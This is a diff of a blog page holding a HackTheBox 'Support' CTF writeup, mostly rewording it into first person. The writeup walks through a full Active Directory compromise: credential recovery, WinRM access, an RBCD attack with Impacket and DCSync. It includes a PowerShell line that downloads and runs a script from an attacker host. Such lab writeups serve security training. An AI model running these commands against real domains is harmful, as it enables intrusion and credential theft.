@@ -125,7 +125,7 @@
     "keywords": ["HackTheBox","Windows","Active Directory","LDAP","SMB","RBCD","Impacket","BloodHound","CTF Writeup"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "934"
+    "wordCount": "938"
   }
   </script>
     
@@ -246,7 +246,7 @@
                   
                   ><span
                       class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
-                      >Blog</span
+                      >Writeups</span
                     >
                   </a
                 >
@@ -472,7 +472,7 @@
       
       <div class="min-h-0 min-w-0 max-w-prose grow">
         <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>Support is a HackTheBox machine featuring a single Windows Domain Controller running Active Directory. The attack chain begins with SMB enumeration that reveals a custom .NET application called UserInfo.exe in an open share. Reverse engineering the application exposes hardcoded LDAP credentials, which are used to dump the domain via ldapdomaindump. A password found in the <code>info</code> attribute of the <code>support</code> user enables WinRM access. BloodHound analysis reveals that the Shared Support Accounts group has <strong>GenericAll</strong> on the DC computer object, allowing a Resource-Based Constrained Delegation (RBCD) attack that leads to full domain compromise through DCSync.</p>
-<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>A full port scan identified the machine as a Windows Domain Controller.</p>
+<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>I performed a full port scan, which identified the machine as a Windows Domain Controller.</p>
 <pre tabindex="0"><code>nmap -sV -sC -p- 10.129.41.4
 </code></pre><pre tabindex="0"><code>PORT      STATE SERVICE       REASON          VERSION
 53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
@@ -570,7 +570,7 @@ nxc smb support.htb -u guest -p &#39;&#39; --shares
 
 </figure>
 </p>
-<p>The non-standard share <code>support-tools</code> was accessible.</p>
+<p>I could access the non-standard share <code>support-tools</code>.</p>
 <pre tabindex="0"><code>smbclient \\\\10.129.41.4\\support-tools
 </code></pre><p>
 
@@ -759,7 +759,7 @@ nxc smb support.htb -u guest -p &#39;&#39; --shares
 
 </figure>
 </p>
-<h2 id="step-2-initial-access" class="relative group">Step 2: Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-initial-access" aria-label="Anchor">#</a></span></h2><h3 id="reverse-engineering-userinfoexe" class="relative group">Reverse Engineering UserInfo.exe <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reverse-engineering-userinfoexe" aria-label="Anchor">#</a></span></h3><p>The zip file was extracted, revealing a .NET application.</p>
+<h2 id="step-2-initial-access" class="relative group">Step 2: Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-initial-access" aria-label="Anchor">#</a></span></h2><h3 id="reverse-engineering-userinfoexe" class="relative group">Reverse Engineering UserInfo.exe <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reverse-engineering-userinfoexe" aria-label="Anchor">#</a></span></h3><p>I extracted the zip file, revealing a .NET application.</p>
 <pre tabindex="0"><code>unzip UserInfo.exe.zip
 </code></pre><p>
 
@@ -964,18 +964,18 @@ nxc smb support.htb -u guest -p &#39;&#39; --shares
 
 </figure>
 </p>
-<p>Decompiling the source code with dnSpy exposed a hardcoded encrypted password in <code>UserInfo.Services.Protected.cs</code> with an XOR decryption routine using the key <code>armando</code>. Decrypting the base64-encoded blob yielded the <code>ldap</code> service account credentials:</p>
+<p>Decompiling the source code with dnSpy, I found a hardcoded encrypted password in <code>UserInfo.Services.Protected.cs</code> with an XOR decryption routine using the key <code>armando</code>. Decrypting the base64-encoded blob yielded the <code>ldap</code> service account credentials:</p>
 <ul>
 <li><strong>Username:</strong> <code>ldap</code></li>
 <li><strong>Password:</strong> <code>&lt;REDACTED&gt;</code></li>
 </ul>
-<h3 id="ldap-domain-dump" class="relative group">LDAP Domain Dump <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ldap-domain-dump" aria-label="Anchor">#</a></span></h3><p>Using the recovered credentials, the domain was enumerated with ldapdomaindump.</p>
+<h3 id="ldap-domain-dump" class="relative group">LDAP Domain Dump <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ldap-domain-dump" aria-label="Anchor">#</a></span></h3><p>Using the recovered credentials, I enumerated the domain with ldapdomaindump.</p>
 <pre tabindex="0"><code>ldapdomaindump &#39;ldap://support.htb&#39; -u &#39;support.htb\ldap&#39; -p &#39;&lt;REDACTED&gt;&#39;
 </code></pre><p>The dumped <code>domain_users.json</code> revealed that the <code>support</code> user&rsquo;s <code>info</code> attribute contained a plaintext password:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="s2">&#34;info&#34;</span><span class="err">:</span> <span class="p">[</span><span class="s2">&#34;&lt;REDACTED&gt;&#34;</span><span class="p">]</span>
 </span></span></code></pre></div><h3 id="winrm-access" class="relative group">WinRM Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#winrm-access" aria-label="Anchor">#</a></span></h3><p>The <code>support</code> user was a member of Remote Management Users, granting WinRM access.</p>
 <pre tabindex="0"><code>evil-winrm -u support -p &lt;REDACTED&gt; -i 10.129.41.4
-</code></pre><h2 id="step-3-domain-enumeration-with-bloodhound" class="relative group">Step 3: Domain Enumeration with BloodHound <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-domain-enumeration-with-bloodhound" aria-label="Anchor">#</a></span></h2><p>SharpHound was executed from the WinRM session to collect Active Directory data. The resulting BloodHound analysis revealed a critical privilege:</p>
+</code></pre><h2 id="step-3-domain-enumeration-with-bloodhound" class="relative group">Step 3: Domain Enumeration with BloodHound <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-domain-enumeration-with-bloodhound" aria-label="Anchor">#</a></span></h2><p>I executed SharpHound from the WinRM session to collect Active Directory data. The resulting BloodHound analysis revealed a critical privilege:</p>
 <pre tabindex="0"><code>support → Shared Support Accounts → GenericAll → DC.SUPPORT.HTB
 </code></pre><p>The <code>Shared Support Accounts</code> group (containing only the <code>support</code> user) had <strong>GenericAll</strong> on the <code>DC$</code> computer object. This grants full control, including the ability to modify <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> — the key to an RBCD attack.</p>
 <p>Additional details:</p>
@@ -985,28 +985,28 @@ nxc smb support.htb -u guest -p &#39;&#39; --shares
 <li><strong>Domain Admins:</strong> Only <code>Administrator</code></li>
 </ul>
 <h2 id="step-4-privilege-escalation-via-rbcd" class="relative group">Step 4: Privilege Escalation via RBCD <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-privilege-escalation-via-rbcd" aria-label="Anchor">#</a></span></h2><p>Resource-Based Constrained Delegation allows a computer account to impersonate any user to services on a target computer if the target&rsquo;s <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute is set to allow it.</p>
-<h3 id="creating-a-machine-account" class="relative group">Creating a Machine Account <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#creating-a-machine-account" aria-label="Anchor">#</a></span></h3><p>Powermad was loaded and a fake computer account was created.</p>
+<h3 id="creating-a-machine-account" class="relative group">Creating a Machine Account <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#creating-a-machine-account" aria-label="Anchor">#</a></span></h3><p>I loaded Powermad and created a fake computer account.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="py">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.208:8000/Powermad.ps1&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">k40t1k</span> <span class="n">-Password</span> <span class="vm">$</span><span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;&lt;REDACTED&gt;&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
 </span></span></code></pre></div><h3 id="retrieving-the-sid" class="relative group">Retrieving the SID <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#retrieving-the-sid" aria-label="Anchor">#</a></span></h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">k40t1k</span>
-</span></span></code></pre></div><p>The SID <code>S-1-5-21-1677581083-3380853377-188903654-6104</code> was noted.</p>
-<h3 id="setting-rbcd-on-the-domain-controller" class="relative group">Setting RBCD on the Domain Controller <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#setting-rbcd-on-the-domain-controller" aria-label="Anchor">#</a></span></h3><p>A security descriptor was crafted granting <code>k40t1k$</code> delegation rights to <code>DC$</code>.</p>
+</span></span></code></pre></div><p>I noted the SID <code>S-1-5-21-1677581083-3380853377-188903654-6104</code>.</p>
+<h3 id="setting-rbcd-on-the-domain-controller" class="relative group">Setting RBCD on the Domain Controller <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#setting-rbcd-on-the-domain-controller" aria-label="Anchor">#</a></span></h3><p>I crafted a security descriptor granting <code>k40t1k$</code> delegation rights to <code>DC$</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="py">AccessControl</span><span class="p">.</span><span class="py">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-6104)&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$SD</span><span class="p">.</span><span class="py">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">dc</span> <span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="vm">@</span><span class="p">{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
-</span></span></code></pre></div><h3 id="requesting-a-ticket-as-administrator" class="relative group">Requesting a Ticket as Administrator <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#requesting-a-ticket-as-administrator" aria-label="Anchor">#</a></span></h3><p>Back on Kali, a forwardable TGS ticket was requested impersonating Domain Administrator.</p>
+</span></span></code></pre></div><h3 id="requesting-a-ticket-as-administrator" class="relative group">Requesting a Ticket as Administrator <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#requesting-a-ticket-as-administrator" aria-label="Anchor">#</a></span></h3><p>Back on Kali, I requested a forwardable TGS ticket impersonating Domain Administrator.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-getST <span class="s1">&#39;support.htb/k40t1k$&#39;</span> -spn http/dc.support.htb <span class="se">\
 </span></span></span><span class="line"><span class="cl">  -hashes :<span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&#34;&lt;REDACTED&gt;&#34;</span> <span class="p">|</span> iconv -t utf16le <span class="p">|</span> openssl md4 <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f2<span class="k">)</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  -impersonate administrator
-</span></span></code></pre></div><h3 id="domain-compromise-via-dcsync" class="relative group">Domain Compromise via DCSync <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#domain-compromise-via-dcsync" aria-label="Anchor">#</a></span></h3><p>Using the obtained ticket, domain credentials were extracted from NTDS.dit.</p>
+</span></span></code></pre></div><h3 id="domain-compromise-via-dcsync" class="relative group">Domain Compromise via DCSync <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#domain-compromise-via-dcsync" aria-label="Anchor">#</a></span></h3><p>Using the obtained ticket, I extracted domain credentials from NTDS.dit.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator@http_dc.support.htb@SUPPORT.HTB.ccache
 </span></span><span class="line"><span class="cl">impacket-secretsdump -k -no-pass dc.support.htb
 </span></span></code></pre></div><pre tabindex="0"><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::
 support:1105:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::
 DC$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::
-</code></pre><p>SYSTEM-level access was verified.</p>
+</code></pre><p>I verified SYSTEM-level access.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-atexec -k -no-pass dc.support.htb <span class="s1">&#39;whoami&#39;</span>
 </span></span></code></pre></div><pre tabindex="0"><code>nt authority\system
 </code></pre><h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>This machine demonstrated a full Active Directory attack chain from SMB reconnaissance and .NET reverse engineering to domain compromise via RBCD abuse.</p>
